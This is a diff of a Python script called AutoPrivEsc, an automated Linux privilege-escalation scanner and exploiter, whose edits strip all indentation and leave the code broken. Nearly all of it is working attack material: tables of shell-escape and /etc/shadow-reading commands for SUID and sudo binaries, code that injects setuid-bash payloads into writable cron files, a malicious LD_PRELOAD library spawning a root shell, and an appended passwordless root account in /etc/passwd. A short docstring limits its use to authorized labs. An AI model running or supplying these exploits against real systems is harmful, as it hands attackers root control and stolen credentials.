@@ -4,28 +4,28 @@ AutoPrivEsc — Linux Privilege Escalation Scanner & Auto-Exploiter
 ==================================================================
 Runs on a compromised Linux machine as a low-privilege user.
 Automatically:
-  1. Scans for common privilege escalation vectors
-  2. Attempts to exploit each found vector
-  3. Reports what succeeded and what failed
+1. Scans for common privilege escalation vectors
+2. Attempts to exploit each found vector
+3. Reports what succeeded and what failed
 
 Vectors covered:
-  - SUID binaries (checked against GTFOBins)
-  - Sudo misconfigurations (NOPASSWD, dangerous binaries)
-  - Writable cron jobs
-  - LD_PRELOAD sudo abuse
-  - Writable /etc/passwd
-  - World-writable scripts run by root
-  - PATH hijacking opportunities
-  - Capabilities (cap_setuid)
+- SUID binaries (checked against GTFOBins)
+- Sudo misconfigurations (NOPASSWD, dangerous binaries)
+- Writable cron jobs
+- LD_PRELOAD sudo abuse
+- Writable /etc/passwd
+- World-writable scripts run by root
+- PATH hijacking opportunities
+- Capabilities (cap_setuid)
 
 Usage:
-    python3 autoprivesc.py           # scan + auto-exploit
-    python3 autoprivesc.py --scan    # scan only, no exploitation
-    python3 autoprivesc.py --report  # save report to file
+python3 autoprivesc.py # scan + auto-exploit
+python3 autoprivesc.py --scan # scan only, no exploitation
+python3 autoprivesc.py --report # save report to file
 
 WARNING:
-    For authorized use in CTF, lab, and pentest environments only.
-    Running this on systems you don't own is illegal.
+For authorized use in CTF, lab, and pentest environments only.
+Running this on systems you don't own is illegal.
 """
 
 import os
@@ -43,19 +43,19 @@ from datetime import datetime
 # ─────────────────────────────────────────────
 
 class C:
-    RED    = "\033[91m"
-    GREEN  = "\033[92m"
-    YELLOW = "\033[93m"
-    BLUE   = "\033[94m"
-    CYAN   = "\033[96m"
-    BOLD   = "\033[1m"
-    RESET  = "\033[0m"
+RED = "\033[91m"
+GREEN = "\033[92m"
+YELLOW = "\033[93m"
+BLUE = "\033[94m"
+CYAN = "\033[96m"
+BOLD = "\033[1m"
+RESET = "\033[0m"
 
-def red(t):    return f"{C.RED}{t}{C.RESET}"
-def green(t):  return f"{C.GREEN}{t}{C.RESET}"
+def red(t): return f"{C.RED}{t}{C.RESET}"
+def green(t): return f"{C.GREEN}{t}{C.RESET}"
 def yellow(t): return f"{C.YELLOW}{t}{C.RESET}"
-def bold(t):   return f"{C.BOLD}{t}{C.RESET}"
-def cyan(t):   return f"{C.CYAN}{t}{C.RESET}"
+def bold(t): return f"{C.BOLD}{t}{C.RESET}"
+def cyan(t): return f"{C.CYAN}{t}{C.RESET}"
 
 
 # ─────────────────────────────────────────────
@@ -65,94 +65,94 @@ def cyan(t):   return f"{C.CYAN}{t}{C.RESET}"
 # Maps binary name → shell escape command via GTFOBins
 # Each command drops to a shell or reads /etc/shadow as root
 GTFOBINS_SUID = {
-    "bash":      "bash -p",
-    "sh":        "sh -p",
-    "dash":      "dash -p",
-    "find":      "find . -exec /bin/bash -p \\; -quit",
-    "vim":       "vim -c ':py import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'",
-    "vi":        "vi -c ':py import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'",
-    "nano":      "nano -s /bin/bash /etc/passwd\n/bin/bash\n",
-    "less":      "less /etc/passwd\n!/bin/bash\n",
-    "more":      "more /etc/passwd\n!/bin/bash\n",
-    "man":       "man man\n!/bin/bash\n",
-    "awk":       "awk 'BEGIN {system(\"/bin/bash -p\")}'",
-    "nmap":      "nmap --interactive\n!sh\n",
-    "perl":      "perl -e 'exec \"/bin/bash -p\";'",
-    "python":    "python -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'",
-    "python3":   "python3 -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'",
-    "ruby":      "ruby -e 'exec \"/bin/bash -p\"'",
-    "php":       "php -r 'pcntl_exec(\"/bin/bash\", [\"-p\"]);'",
-    "node":      "node -e 'require(\"child_process\").spawn(\"/bin/bash\", [\"-p\"], {stdio: [0,1,2]})'",
-    "lua":       "lua -e 'os.execute(\"/bin/bash -p\")'",
-    "tclsh":     "tclsh\nexec /bin/bash -p\n",
-    "env":       "env /bin/bash -p",
-    "taskset":   "taskset 1 /bin/bash -p",
-    "strace":    "strace -o /dev/null /bin/bash -p",
-    "tee":       "echo 'root2::0:0:root:/root:/bin/bash' | tee -a /etc/passwd",
-    "cp":        "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p",
-    "mv":        None,  # complex, skip auto-exploit
-    "wget":      "wget -O /etc/sudoers.d/evil 'data:,user ALL=(ALL) NOPASSWD: ALL'",
-    "curl":      "curl 'data:,root2::0:0:root:/root:/bin/bash' -o /tmp/pw && cat /tmp/pw >> /etc/passwd",
-    "tar":       "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
-    "zip":       "zip /tmp/z.zip /tmp/z.zip -T --unzip-command='sh -c /bin/bash'",
-    "git":       "git -p help config\n!/bin/bash\n",
-    "ftp":       "ftp\n!/bin/bash\n",
-    "socat":     "socat stdin exec:/bin/bash,pty,stderr,setsid,sigint,sane",
-    "xterm":     "xterm -ut -e /bin/bash -p",
-    "base64":    "base64 /etc/shadow | base64 -d",
-    "cat":       "cat /etc/shadow",
-    "head":      "head /etc/shadow",
-    "tail":      "tail /etc/shadow",
-    "cut":       "cut -d: -f1 /etc/shadow",
-    "sort":      "sort /etc/shadow",
-    "uniq":      "uniq /etc/shadow",
-    "strings":   "strings /etc/shadow",
-    "od":        "od -An -c /etc/shadow",
-    "xxd":       "xxd /etc/shadow",
-    "hexdump":   "hexdump -C /etc/shadow",
-    "nl":        "nl /etc/shadow",
-    "wc":        None,
-    "dd":        "dd if=/etc/shadow",
-    "diff":      "diff --line-format=%L /dev/null /etc/shadow",
-    "ed":        "ed /etc/shadow\n,p\n",
+"bash": "bash -p",
+"sh": "sh -p",
+"dash": "dash -p",
+"find": "find . -exec /bin/bash -p \\; -quit",
+"vim": "vim -c ':py import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'",
+"vi": "vi -c ':py import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'",
+"nano": "nano -s /bin/bash /etc/passwd\n/bin/bash\n",
+"less": "less /etc/passwd\n!/bin/bash\n",
+"more": "more /etc/passwd\n!/bin/bash\n",
+"man": "man man\n!/bin/bash\n",
+"awk": "awk 'BEGIN {system(\"/bin/bash -p\")}'",
+"nmap": "nmap --interactive\n!sh\n",
+"perl": "perl -e 'exec \"/bin/bash -p\";'",
+"python": "python -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'",
+"python3": "python3 -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'",
+"ruby": "ruby -e 'exec \"/bin/bash -p\"'",
+"php": "php -r 'pcntl_exec(\"/bin/bash\", [\"-p\"]);'",
+"node": "node -e 'require(\"child_process\").spawn(\"/bin/bash\", [\"-p\"], {stdio: [0,1,2]})'",
+"lua": "lua -e 'os.execute(\"/bin/bash -p\")'",
+"tclsh": "tclsh\nexec /bin/bash -p\n",
+"env": "env /bin/bash -p",
+"taskset": "taskset 1 /bin/bash -p",
+"strace": "strace -o /dev/null /bin/bash -p",
+"tee": "echo 'root2::0:0:root:/root:/bin/bash' | tee -a /etc/passwd",
+"cp": "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p",
+"mv": None, # complex, skip auto-exploit
+"wget": "wget -O /etc/sudoers.d/evil 'data:,user ALL=(ALL) NOPASSWD: ALL'",
+"curl": "curl 'data:,root2::0:0:root:/root:/bin/bash' -o /tmp/pw && cat /tmp/pw >> /etc/passwd",
+"tar": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
+"zip": "zip /tmp/z.zip /tmp/z.zip -T --unzip-command='sh -c /bin/bash'",
+"git": "git -p help config\n!/bin/bash\n",
+"ftp": "ftp\n!/bin/bash\n",
+"socat": "socat stdin exec:/bin/bash,pty,stderr,setsid,sigint,sane",
+"xterm": "xterm -ut -e /bin/bash -p",
+"base64": "base64 /etc/shadow | base64 -d",
+"cat": "cat /etc/shadow",
+"head": "head /etc/shadow",
+"tail": "tail /etc/shadow",
+"cut": "cut -d: -f1 /etc/shadow",
+"sort": "sort /etc/shadow",
+"uniq": "uniq /etc/shadow",
+"strings": "strings /etc/shadow",
+"od": "od -An -c /etc/shadow",
+"xxd": "xxd /etc/shadow",
+"hexdump": "hexdump -C /etc/shadow",
+"nl": "nl /etc/shadow",
+"wc": None,
+"dd": "dd if=/etc/shadow",
+"diff": "diff --line-format=%L /dev/null /etc/shadow",
+"ed": "ed /etc/shadow\n,p\n",
 }
 
 # Sudo-specific GTFOBins (run as: sudo <binary> <args>)
 GTFOBINS_SUDO = {
-    "bash":    "sudo bash",
-    "sh":      "sudo sh",
-    "find":    "sudo find . -exec /bin/bash \\; -quit",
-    "vim":     "sudo vim -c ':!/bin/bash'",
-    "vi":      "sudo vi -c ':!/bin/bash'",
-    "nano":    "sudo nano\n^R^X\nreset; sh 1>&0 2>&0\n",
-    "less":    "sudo less /etc/passwd\n!/bin/bash\n",
-    "awk":     "sudo awk 'BEGIN {system(\"/bin/bash\")}'",
-    "perl":    "sudo perl -e 'exec \"/bin/bash\";'",
-    "python":  "sudo python -c 'import os; os.system(\"/bin/bash\")'",
-    "python3": "sudo python3 -c 'import os; os.system(\"/bin/bash\")'",
-    "ruby":    "sudo ruby -e 'exec \"/bin/bash\"'",
-    "php":     "sudo php -r 'system(\"/bin/bash\");'",
-    "env":     "sudo env /bin/bash",
-    "nmap":    "sudo nmap --interactive\n!sh\n",
-    "tar":     "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
-    "zip":     "sudo zip /tmp/z /tmp/z -T --unzip-command='sh -c /bin/bash'",
-    "git":     "sudo git -p help\n!/bin/bash\n",
-    "ftp":     "sudo ftp\n!/bin/bash\n",
-    "man":     "sudo man man\n!/bin/bash\n",
-    "more":    "sudo more /etc/passwd\n!/bin/bash\n",
-    "node":    "sudo node -e 'require(\"child_process\").spawn(\"/bin/bash\", {stdio: [0,1,2]})'",
-    "lua":     "sudo lua -e 'os.execute(\"/bin/bash\")'",
-    "tclsh":   "sudo tclsh\nexec /bin/bash\n",
-    "socat":   "sudo socat stdin exec:/bin/bash",
-    "dd":      "sudo dd if=/etc/shadow",
-    "cat":     "sudo cat /etc/shadow",
-    "cp":      "sudo cp /bin/bash /tmp/rootbash && sudo chmod +s /tmp/rootbash && /tmp/rootbash -p",
-    "curl":    "sudo curl 'data:,root2::0:0:root:/root:/bin/bash' -o /tmp/pw && cat /tmp/pw >> /etc/passwd",
-    "wget":    "sudo wget -O- 'data:,root2::0:0:root:/root:/bin/bash' >> /etc/passwd",
-    "base64":  "sudo base64 /etc/shadow | base64 -d",
-    "tee":     "echo 'root2::0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd",
-    "chmod":   "sudo chmod +s /bin/bash && /bin/bash -p",
-    "chown":   "sudo chown $(id -un):$(id -gn) /etc/shadow",
+"bash": "sudo bash",
+"sh": "sudo sh",
+"find": "sudo find . -exec /bin/bash \\; -quit",
+"vim": "sudo vim -c ':!/bin/bash'",
+"vi": "sudo vi -c ':!/bin/bash'",
+"nano": "sudo nano\n^R^X\nreset; sh 1>&0 2>&0\n",
+"less": "sudo less /etc/passwd\n!/bin/bash\n",
+"awk": "sudo awk 'BEGIN {system(\"/bin/bash\")}'",
+"perl": "sudo perl -e 'exec \"/bin/bash\";'",
+"python": "sudo python -c 'import os; os.system(\"/bin/bash\")'",
+"python3": "sudo python3 -c 'import os; os.system(\"/bin/bash\")'",
+"ruby": "sudo ruby -e 'exec \"/bin/bash\"'",
+"php": "sudo php -r 'system(\"/bin/bash\");'",
+"env": "sudo env /bin/bash",
+"nmap": "sudo nmap --interactive\n!sh\n",
+"tar": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
+"zip": "sudo zip /tmp/z /tmp/z -T --unzip-command='sh -c /bin/bash'",
+"git": "sudo git -p help\n!/bin/bash\n",
+"ftp": "sudo ftp\n!/bin/bash\n",
+"man": "sudo man man\n!/bin/bash\n",
+"more": "sudo more /etc/passwd\n!/bin/bash\n",
+"node": "sudo node -e 'require(\"child_process\").spawn(\"/bin/bash\", {stdio: [0,1,2]})'",
+"lua": "sudo lua -e 'os.execute(\"/bin/bash\")'",
+"tclsh": "sudo tclsh\nexec /bin/bash\n",
+"socat": "sudo socat stdin exec:/bin/bash",
+"dd": "sudo dd if=/etc/shadow",
+"cat": "sudo cat /etc/shadow",
+"cp": "sudo cp /bin/bash /tmp/rootbash && sudo chmod +s /tmp/rootbash && /tmp/rootbash -p",
+"curl": "sudo curl 'data:,root2::0:0:root:/root:/bin/bash' -o /tmp/pw && cat /tmp/pw >> /etc/passwd",
+"wget": "sudo wget -O- 'data:,root2::0:0:root:/root:/bin/bash' >> /etc/passwd",
+"base64": "sudo base64 /etc/shadow | base64 -d",
+"tee": "echo 'root2::0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd",
+"chmod": "sudo chmod +s /bin/bash && /bin/bash -p",
+"chown": "sudo chown $(id -un):$(id -gn) /etc/shadow",
 }
 
 
@@ -161,51 +161,51 @@ GTFOBINS_SUDO = {
 # ─────────────────────────────────────────────
 
 def run_cmd(cmd, shell=True, timeout=5):
-    """Runs a shell command and returns stdout, stderr, returncode."""
-    try:
-        result = subprocess.run(
-            cmd, shell=shell, capture_output=True,
-            text=True, timeout=timeout
-        )
-        return result.stdout.strip(), result.stderr.strip(), result.returncode
-    except subprocess.TimeoutExpired:
-        return "", "TIMEOUT", -1
-    except Exception as e:
-        return "", str(e), -1
+"""Runs a shell command and returns stdout, stderr, returncode."""
+try:
+result = subprocess.run(
+cmd, shell=shell, capture_output=True,
+text=True, timeout=timeout
+)
+return result.stdout.strip(), result.stderr.strip(), result.returncode
+except subprocess.TimeoutExpired:
+return "", "TIMEOUT", -1
+except Exception as e:
+return "", str(e), -1
 
 
 def is_root():
-    return os.geteuid() == 0
+return os.geteuid() == 0
 
 
 def get_current_user():
-    return pwd.getpwuid(os.getuid()).pw_name
+return pwd.getpwuid(os.getuid()).pw_name
 
 
 def section(title):
-    print(f"\n{bold(cyan('═' * 55))}")
-    print(f"  {bold(title)}")
-    print(f"{bold(cyan('═' * 55))}")
+print(f"\n{bold(cyan('═' * 55))}")
+print(f" {bold(title)}")
+print(f"{bold(cyan('═' * 55))}")
 
 
 def found(msg):
-    print(f"  {yellow('[FOUND]')} {msg}")
+print(f" {yellow('[FOUND]')} {msg}")
 
 
 def exploited(msg):
-    print(f"  {green('[EXPLOITED]')} {msg}")
+print(f" {green('[EXPLOITED]')} {msg}")
 
 
 def failed(msg):
-    print(f"  {red('[FAILED]')} {msg}")
+print(f" {red('[FAILED]')} {msg}")
 
 
 def info(msg):
-    print(f"  {cyan('[*]')} {msg}")
+print(f" {cyan('[*]')} {msg}")
 
 
 def skip(msg):
-    print(f"  [-] {msg}")
+print(f" [-] {msg}")
 
 
 # ─────────────────────────────────────────────
@@ -213,19 +213,19 @@ def skip(msg):
 # ─────────────────────────────────────────────
 
 results = {
-    "found":     [],
-    "exploited": [],
-    "failed":    [],
+"found": [],
+"exploited": [],
+"failed": [],
 }
 
 def log_found(vector, detail):
-    results["found"].append({"vector": vector, "detail": detail})
+results["found"].append({"vector": vector, "detail": detail})
 
 def log_exploited(vector, cmd):
-    results["exploited"].append({"vector": vector, "cmd": cmd})
+results["exploited"].append({"vector": vector, "cmd": cmd})
 
 def log_failed(vector, reason):
-    results["failed"].append({"vector": vector, "reason": reason})
+results["failed"].append({"vector": vector, "reason": reason})
 
 
 # ─────────────────────────────────────────────
@@ -233,30 +233,30 @@ def log_failed(vector, reason):
 # ─────────────────────────────────────────────
 
 def check_suid(exploit=True):
-    section("VECTOR 1 — SUID Binaries")
-    info("Searching for SUID binaries...")
+section("VECTOR 1 — SUID Binaries")
+info("Searching for SUID binaries...")
 
-    stdout, _, _ = run_cmd("find / -perm -4000 -type f 2>/dev/null")
-    if not stdout:
-        skip("No SUID binaries found.")
-        return
+stdout, _, _ = run_cmd("find / -perm -4000 -type f 2>/dev/null")
+if not stdout:
+skip("No SUID binaries found.")
+return
 
-    suid_bins = stdout.splitlines()
-    info(f"Found {len(suid_bins)} SUID binary/binaries")
+suid_bins = stdout.splitlines()
+info(f"Found {len(suid_bins)} SUID binary/binaries")
 
-    for path in suid_bins:
-        name = os.path.basename(path)
-        if name in GTFOBINS_SUID:
-            cmd = GTFOBINS_SUID[name]
-            found(f"{path} — exploitable via GTFOBins")
-            log_found("SUID", path)
+for path in suid_bins:
+name = os.path.basename(path)
+if name in GTFOBINS_SUID:
+cmd = GTFOBINS_SUID[name]
+found(f"{path} — exploitable via GTFOBins")
+log_found("SUID", path)
 
-            if exploit and cmd:
-                print(f"\n  {bold('Exploit command:')}")
-                print(f"  {yellow(cmd)}\n")
-                log_exploited("SUID", cmd)
-        else:
-            print(f"  [?] {path} — not in GTFOBins database")
+if exploit and cmd:
+print(f"\n {bold('Exploit command:')}")
+print(f" {yellow(cmd)}\n")
+log_exploited("SUID", cmd)
+else:
+print(f" [?] {path} — not in GTFOBins database")
 
 
 # ─────────────────────────────────────────────
@@ -264,48 +264,48 @@ def check_suid(exploit=True):
 # ─────────────────────────────────────────────
 
 def check_sudo(exploit=True):
-    section("VECTOR 2 — Sudo Misconfigurations")
-    info("Running sudo -l ...")
+section("VECTOR 2 — Sudo Misconfigurations")
+info("Running sudo -l ...")
 
-    stdout, stderr, code = run_cmd("sudo -l 2>/dev/null")
+stdout, stderr, code = run_cmd("sudo -l 2>/dev/null")
 
-    if not stdout or "not allowed" in stdout.lower():
-        skip("No sudo privileges found or sudo not available.")
-        return
+if not stdout or "not allowed" in stdout.lower():
+skip("No sudo privileges found or sudo not available.")
+return
 
-    print(f"\n  {stdout}\n")
+print(f"\n {stdout}\n")
 
-    # Check for NOPASSWD entries
-    if "NOPASSWD" in stdout:
-        found("NOPASSWD sudo rule detected!")
-        log_found("SUDO_NOPASSWD", stdout)
+# Check for NOPASSWD entries
+if "NOPASSWD" in stdout:
+found("NOPASSWD sudo rule detected!")
+log_found("SUDO_NOPASSWD", stdout)
 
-        # Extract the allowed binary
-        for line in stdout.splitlines():
-            if "NOPASSWD" in line:
-                # Parse: (ALL) NOPASSWD: /usr/bin/vim
-                parts = line.strip().split()
-                for part in parts:
-                    binary_name = os.path.basename(part.rstrip(","))
-                    if binary_name in GTFOBINS_SUDO:
-                        cmd = GTFOBINS_SUDO[binary_name]
-                        found(f"Exploitable sudo binary: {part}")
+# Extract the allowed binary
+for line in stdout.splitlines():
+if "NOPASSWD" in line:
+# Parse: (ALL) NOPASSWD: /usr/bin/vim
+parts = line.strip().split()
+for part in parts:
+binary_name = os.path.basename(part.rstrip(","))
+if binary_name in GTFOBINS_SUDO:
+cmd = GTFOBINS_SUDO[binary_name]
+found(f"Exploitable sudo binary: {part}")
 
-                        if exploit:
-                            print(f"\n  {bold('Exploit command:')}")
-                            print(f"  {yellow(cmd)}\n")
-                            log_exploited("SUDO_NOPASSWD", cmd)
+if exploit:
+print(f"\n {bold('Exploit command:')}")
+print(f" {yellow(cmd)}\n")
+log_exploited("SUDO_NOPASSWD", cmd)
 
-    # Check for ALL privilege
-    if "(ALL : ALL) ALL" in stdout or "(ALL) ALL" in stdout:
-        found("User has full sudo access — run: sudo su")
-        if exploit:
-            log_exploited("SUDO_ALL", "sudo su")
+# Check for ALL privilege
+if "(ALL : ALL) ALL" in stdout or "(ALL) ALL" in stdout:
+found("User has full sudo access — run: sudo su")
+if exploit:
+log_exploited("SUDO_ALL", "sudo su")
 
-    # Check for dangerous wildcard
-    if "%" in stdout or "*" in stdout:
-        found("Wildcard in sudo rule — potential abuse vector")
-        log_found("SUDO_WILDCARD", stdout)
+# Check for dangerous wildcard
+if "%" in stdout or "*" in stdout:
+found("Wildcard in sudo rule — potential abuse vector")
+log_found("SUDO_WILDCARD", stdout)
 
 
 # ─────────────────────────────────────────────
@@ -313,80 +313,80 @@ def check_sudo(exploit=True):
 # ─────────────────────────────────────────────
 
 def check_cron(exploit=True):
-    section("VECTOR 3 — Writable Cron Jobs")
-    info("Checking cron job files for write permissions...")
+section("VECTOR 3 — Writable Cron Jobs")
+info("Checking cron job files for write permissions...")
 
-    cron_paths = [
-        "/etc/crontab",
-        "/etc/cron.d/",
-        "/etc/cron.daily/",
-        "/etc/cron.hourly/",
-        "/etc/cron.weekly/",
-        "/etc/cron.monthly/",
-        "/var/spool/cron/crontabs/",
-    ]
+cron_paths = [
+"/etc/crontab",
+"/etc/cron.d/",
+"/etc/cron.daily/",
+"/etc/cron.hourly/",
+"/etc/cron.weekly/",
+"/etc/cron.monthly/",
+"/var/spool/cron/crontabs/",
+]
 
-    writable_found = False
+writable_found = False
 
-    for path in cron_paths:
-        if not os.path.exists(path):
-            continue
+for path in cron_paths:
+if not os.path.exists(path):
+continue
 
-        # If it's a directory, check all files inside
-        targets = []
-        if os.path.isdir(path):
-            for f in os.listdir(path):
-                targets.append(os.path.join(path, f))
-        else:
-            targets.append(path)
+# If it's a directory, check all files inside
+targets = []
+if os.path.isdir(path):
+for f in os.listdir(path):
+targets.append(os.path.join(path, f))
+else:
+targets.append(path)
 
-        for target in targets:
-            if os.access(target, os.W_OK):
-                found(f"Writable cron file: {target}")
-                log_found("CRON_WRITABLE", target)
-                writable_found = True
+for target in targets:
+if os.access(target, os.W_OK):
+found(f"Writable cron file: {target}")
+log_found("CRON_WRITABLE", target)
+writable_found = True
 
-                if exploit:
-                    # Inject a reverse shell or setuid bash payload
-                    payload = "* * * * * root chmod +s /bin/bash\n"
-                    print(f"\n  {bold('Exploit — injecting payload into:')} {target}")
-                    print(f"  {yellow('Payload:')} {payload.strip()}")
-                    print(f"  {yellow('After ~1 minute, run:')} /bin/bash -p\n")
+if exploit:
+# Inject a reverse shell or setuid bash payload
+payload = "* * * * * root chmod +s /bin/bash\n"
+print(f"\n {bold('Exploit — injecting payload into:')} {target}")
+print(f" {yellow('Payload:')} {payload.strip()}")
+print(f" {yellow('After ~1 minute, run:')} /bin/bash -p\n")
 
-                    try:
-                        with open(target, "a") as f:
-                            f.write(payload)
-                        exploited(f"Payload injected into {target}")
-                        log_exploited("CRON_WRITABLE", payload)
-                    except Exception as e:
-                        failed(f"Could not write to {target}: {e}")
-                        log_failed("CRON_WRITABLE", str(e))
+try:
+with open(target, "a") as f:
+f.write(payload)
+exploited(f"Payload injected into {target}")
+log_exploited("CRON_WRITABLE", payload)
+except Exception as e:
+failed(f"Could not write to {target}: {e}")
+log_failed("CRON_WRITABLE", str(e))
 
-    # Also check for scripts called by cron that we can write to
-    info("Checking for writable scripts referenced in crontab...")
-    stdout, _, _ = run_cmd("cat /etc/crontab 2>/dev/null")
-    for line in stdout.splitlines():
-        if line.startswith("#") or not line.strip():
-            continue
-        parts = line.split()
-        for part in parts:
-            if part.startswith("/") and os.path.isfile(part) and os.access(part, os.W_OK):
-                found(f"Writable script called by cron: {part}")
-                log_found("CRON_SCRIPT_WRITABLE", part)
-                writable_found = True
+# Also check for scripts called by cron that we can write to
+info("Checking for writable scripts referenced in crontab...")
+stdout, _, _ = run_cmd("cat /etc/crontab 2>/dev/null")
+for line in stdout.splitlines():
+if line.startswith("#") or not line.strip():
+continue
+parts = line.split()
+for part in parts:
+if part.startswith("/") and os.path.isfile(part) and os.access(part, os.W_OK):
+found(f"Writable script called by cron: {part}")
+log_found("CRON_SCRIPT_WRITABLE", part)
+writable_found = True
 
-                if exploit:
-                    payload = "\nchmod +s /bin/bash\n"
-                    try:
-                        with open(part, "a") as f:
-                            f.write(payload)
-                        exploited(f"Payload appended to {part}")
-                        log_exploited("CRON_SCRIPT_WRITABLE", payload)
-                    except Exception as e:
-                        failed(f"Could not write: {e}")
+if exploit:
+payload = "\nchmod +s /bin/bash\n"
+try:
+with open(part, "a") as f:
+f.write(payload)
+exploited(f"Payload appended to {part}")
+log_exploited("CRON_SCRIPT_WRITABLE", payload)
+except Exception as e:
+failed(f"Could not write: {e}")
 
-    if not writable_found:
-        skip("No writable cron files found.")
+if not writable_found:
+skip("No writable cron files found.")
 
 
 # ─────────────────────────────────────────────
@@ -394,69 +394,69 @@ def check_cron(exploit=True):
 # ─────────────────────────────────────────────
 
 def check_ld_preload(exploit=True):
-    section("VECTOR 4 — LD_PRELOAD Sudo Abuse")
-    info("Checking for LD_PRELOAD in sudo env_keep...")
+section("VECTOR 4 — LD_PRELOAD Sudo Abuse")
+info("Checking for LD_PRELOAD in sudo env_keep...")
 
-    stdout, _, _ = run_cmd("sudo -l 2>/dev/null")
+stdout, _, _ = run_cmd("sudo -l 2>/dev/null")
 
-    if "LD_PRELOAD" not in stdout:
-        skip("LD_PRELOAD not preserved in sudo environment.")
-        return
+if "LD_PRELOAD" not in stdout:
+skip("LD_PRELOAD not preserved in sudo environment.")
+return
 
-    found("sudo preserves LD_PRELOAD — exploitable!")
-    log_found("LD_PRELOAD", "sudo env_keep includes LD_PRELOAD")
+found("sudo preserves LD_PRELOAD — exploitable!")
+log_found("LD_PRELOAD", "sudo env_keep includes LD_PRELOAD")
 
-    if exploit:
-        # Write a malicious shared library that spawns a root shell
-        c_code = """
+if exploit:
+# Write a malicious shared library that spawns a root shell
+c_code = """
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 
 void __attribute__((constructor)) init() {
-    unsetenv("LD_PRELOAD");
-    setuid(0);
-    setgid(0);
-    system("/bin/bash -p");
+unsetenv("LD_PRELOAD");
+setuid(0);
+setgid(0);
+system("/bin/bash -p");
 }
 """
-        lib_path = "/tmp/evil.so"
-        c_path   = "/tmp/evil.c"
+lib_path = "/tmp/evil.so"
+c_path = "/tmp/evil.c"
 
-        print(f"\n  {bold('Exploit — building malicious shared library...')}")
+print(f"\n {bold('Exploit — building malicious shared library...')}")
 
-        try:
-            with open(c_path, "w") as f:
-                f.write(c_code)
+try:
+with open(c_path, "w") as f:
+f.write(c_code)
 
-            _, err, code = run_cmd(f"gcc -fPIC -shared -o {lib_path} {c_path} -nostartfiles")
-            if code != 0:
-                failed(f"Compilation failed: {err}")
-                log_failed("LD_PRELOAD", err)
-                return
+_, err, code = run_cmd(f"gcc -fPIC -shared -o {lib_path} {c_path} -nostartfiles")
+if code != 0:
+failed(f"Compilation failed: {err}")
+log_failed("LD_PRELOAD", err)
+return
 
-            # Find any sudo-allowed binary to trigger the library
-            sudo_binary = None
-            for line in stdout.splitlines():
-                if "NOPASSWD" in line:
-                    parts = line.strip().split()
-                    for p in parts:
-                        if p.startswith("/") and os.path.isfile(p):
-                            sudo_binary = p
-                            break
+# Find any sudo-allowed binary to trigger the library
+sudo_binary = None
+for line in stdout.splitlines():
+if "NOPASSWD" in line:
+parts = line.strip().split()
+for p in parts:
+if p.startswith("/") and os.path.isfile(p):
+sudo_binary = p
+break
 
-            if not sudo_binary:
-                sudo_binary = "/usr/bin/find"  # fallback
+if not sudo_binary:
+sudo_binary = "/usr/bin/find" # fallback
 
-            exploit_cmd = f"sudo LD_PRELOAD={lib_path} {sudo_binary}"
-            print(f"  {bold('Run this command:')}")
-            print(f"  {yellow(exploit_cmd)}\n")
-            exploited("LD_PRELOAD library built — run the command above for root shell")
-            log_exploited("LD_PRELOAD", exploit_cmd)
+exploit_cmd = f"sudo LD_PRELOAD={lib_path} {sudo_binary}"
+print(f" {bold('Run this command:')}")
+print(f" {yellow(exploit_cmd)}\n")
+exploited("LD_PRELOAD library built — run the command above for root shell")
+log_exploited("LD_PRELOAD", exploit_cmd)
 
-        except Exception as e:
-            failed(f"LD_PRELOAD exploit failed: {e}")
-            log_failed("LD_PRELOAD", str(e))
+except Exception as e:
+failed(f"LD_PRELOAD exploit failed: {e}")
+log_failed("LD_PRELOAD", str(e))
 
 
 # ─────────────────────────────────────────────
@@ -464,30 +464,30 @@ void __attribute__((constructor)) init() {
 # ─────────────────────────────────────────────
 
 def check_writable_passwd(exploit=True):
-    section("VECTOR 5 — Writable /etc/passwd")
-    info("Checking write permissions on /etc/passwd...")
+section("VECTOR 5 — Writable /etc/passwd")
+info("Checking write permissions on /etc/passwd...")
 
-    if not os.access("/etc/passwd", os.W_OK):
-        skip("/etc/passwd is not writable.")
-        return
+if not os.access("/etc/passwd", os.W_OK):
+skip("/etc/passwd is not writable.")
+return
 
-    found("/etc/passwd is writable!")
-    log_found("WRITABLE_PASSWD", "/etc/passwd")
+found("/etc/passwd is writable!")
+log_found("WRITABLE_PASSWD", "/etc/passwd")
 
-    if exploit:
-        # Add a new root user with no password
-        new_root = "root2::0:0:root:/root:/bin/bash\n"
-        print(f"\n  {bold('Exploit — adding passwordless root user...')}")
-        print(f"  {yellow('New entry:')} {new_root.strip()}")
+if exploit:
+# Add a new root user with no password
+new_root = "root2::0:0:root:/root:/bin/bash\n"
+print(f"\n {bold('Exploit — adding passwordless root user...')}")
+print(f" {yellow('New entry:')} {new_root.strip()}")
 
-        try:
-            with open("/etc/passwd", "a") as f:
-                f.write(new_root)
-            exploited("root2 user added to /etc/passwd — run: su root2")
-            log_exploited("WRITABLE_PASSWD", "su root2")
-        except Exception as e:
-            failed(f"Could not write to /etc/passwd: {e}")
-            log_failed("WRITABLE_PASSWD", str(e))
+try:
+with open("/etc/passwd", "a") as f:
+f.write(new_root)
+exploited("root2 user added to /etc/passwd — run: su root2")
+log_exploited("WRITABLE_PASSWD", "su root2")
+except Exception as e:
+failed(f"Could not write to /etc/passwd: {e}")
+log_failed("WRITABLE_PASSWD", str(e))
 
 
 # ─────────────────────────────────────────────
@@ -495,46 +495,46 @@ def check_writable_passwd(exploit=True):
